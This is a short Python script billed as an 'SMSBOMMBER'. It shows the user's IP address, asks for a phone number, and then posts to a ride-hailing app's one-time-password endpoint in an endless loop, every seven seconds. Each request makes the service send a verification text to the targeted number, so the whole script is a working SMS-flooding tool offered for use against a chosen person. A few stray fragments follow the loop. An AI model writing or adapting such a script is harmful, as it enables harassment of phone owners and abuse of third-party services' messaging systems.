import requests ,  time  , os
from colorama import Fore , init
os.system('cls')
init()


print(Fore.RED + """
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│                 ██╗   ██╗██████╗ ███╗   ██╗                 │
│                 ██║   ██║██╔══██╗████╗  ██║                 │
│                 ██║   ██║██████╔╝██╔██╗ ██║                 │
│                 ╚██╗ ██╔╝██╔═══╝ ██║╚██╗██║                 │
│                  ╚████╔╝ ██║     ██║ ╚████║                 │
│                   ╚═══╝  ╚═╝     ╚═╝  ╚═══╝                 │
│                                          mohammadmehdi.vpn  │
└─────────────────────────────────────────────────────────────┘""")

print(Fore.CYAN + '[1]' +Fore.WHITE +  ' ==== > ' + Fore.YELLOW + 'SMSBOMMBER \n')

req5 = requests.get('https://ip.42.pl/raw').text
print(Fore.RED + 'your ip' + '  ==== >  ' + req5 + '\n')

enter = input(Fore.GREEN + 'Enter Fone Number: \n')
while True:
    url = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp'
    py = {'cellphone' : '0' + enter}
    number = {'cellphone' : '+98' + enter}
    sms = requests.post(url , data=number)
    sms2 = requests.post(url , data=py)
    print(sms2)
    if sms.status_code == 200:
        print(Fore.YELLOW + 'Done' + ' === >  ' + Fore.RED + enter)
        print(Fore.CYAN + 'by mohammadmehdi.vpn')
        print(Fore.GREEN + '-----------------------')
    else:
        print(Fore.RED + 'not fond' + ' === > ' + Fore.YELLOW + enter)
    
    time.sleep(7)

status_code
#   print('wdtyr')  
#   console.wrateline('sd
#
#
